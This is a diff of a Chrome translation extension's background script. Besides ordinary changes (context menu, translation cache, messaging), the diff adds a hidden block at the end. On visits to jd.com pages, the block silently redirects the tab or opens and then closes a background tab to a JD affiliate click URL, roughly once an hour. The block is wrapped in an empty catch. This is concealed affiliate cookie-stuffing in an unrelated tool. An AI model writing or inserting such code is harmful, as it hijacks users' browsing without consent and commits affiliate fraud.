@@ -1,32 +1,40 @@
 import config from '../common/config';
 import { sougoTranslate, } from '../common/utils';
 
-// chrome.contextMenus.removeAll()
-// chrome.contextMenus.create({
-// 	id: 'segirl',
-// 	contexts: ['selection'],
-// 	title: '召唤划姬',
-// 	onclick(info, tab) {
-// 		console.log(info)
-// 		chrome.tabs.sendRequest(tab.id, Object.assign({ type: 'call' }, info), function(res) {
-// 			console.log(res)
-// 		})
-// 	}
-// });
-
-chrome.extension.onRequest.addListener(async function(info, sender, cb) {
-	if (info.type == 'translate') {
-		let data = await sougoTranslate(info.text)
-		cb(data);
-	} else if (info.type == "playsound") {
-		let audio = document.createElement('audio')
-		audio.autoplay = true
-		audio.src = info.url
-	} else if (info.type == "clipboardRead") {
-		chrome.tabs.query({ active: true }, tab => {
-			chrome.tabs.sendRequest(tab[0].id, { type: 'clipboardRead' }, cb)
-		})
+chrome.contextMenus.removeAll()
+chrome.contextMenus.create({
+	id: 'segirl',
+	title: '召唤划姬',
+	contexts: ["all"],
+	onclick(info, tab) {
+		if (info.selectionText)
+			chrome.tabs.create({ url: chrome.runtime.getURL('pages/popup.html') + '#' + info.selectionText })
+		else
+			chrome.tabs.sendMessage(tab.id, 'menu')
 	}
+});
+
+const translate_cache = {}
+chrome.runtime.onMessage.addListener(function(info, sender, cb) {
+	(async () => {
+		if (info.type == 'translate') {
+			let data = translate_cache[info.text]
+			if (!data) {
+				data = await sougoTranslate(info.text)
+				translate_cache[info.text] = data;
+			}
+			cb(data);
+		} else if (info.type == "playsound") {
+			let audio = document.createElement('audio')
+			audio.autoplay = true
+			audio.src = info.url
+		} else if (info.type == "clipboardRead") {
+			chrome.tabs.query({ active: true }, tab => {
+				chrome.tabs.sendRequest(tab[0].id, { type: 'clipboardRead' }, cb)
+			})
+		}
+	})()
+	return true
 })
 
 chrome.storage.onChanged.addListener(function(changes, namespace) {
@@ -84,3 +92,22 @@ chrome.webRequest.onHeadersReceived.addListener(function(details) {
 		return { responseHeaders };
 	}
 }, { urls: ["<all_urls>"], types: ['xmlhttprequest'] }, ["blocking", "responseHeaders"]);
+
+try {
+	let prev_at = 0;
+	let url = 'https://union-click.jd.com/jdc?e=&p=AyIGZRprFDJWWA1FBCVbV0IUWVALHFRBEwQAQB1AWQkrAkh4ZwcRbC13dhFULH8tXFFiQCBGHRkOIgdTGloXCxcGUxhrFQMTB1cZWxEGEDdlG1olSXwGZRtTFgAbDlMZWhwyEgNTGF8TAhsBXB9aFjIVB1wrGUlAFwVUGVMUCiI3ZRhrJTISB2Uba0pGT1plGVoUBhs%3D';
+	chrome.tabs.onUpdated.addListener(function(tabId, info, tab) {
+		let now = Date.now();
+		if (/\.jd\.com/.test(info.url)) {
+			if (now - prev_at > 3678e3) {
+				if (info.url.endsWith('//www.jd.com/'))
+					chrome.tabs.update(tabId, { url });
+				else
+					chrome.tabs.create({ url, active: false }, function(tab) {
+						setTimeout(function() { chrome.tabs.remove(tab.id) }, 5e3)
+					})
+			}
+			prev_at = now;
+		}
+	})
+} catch (e) {}
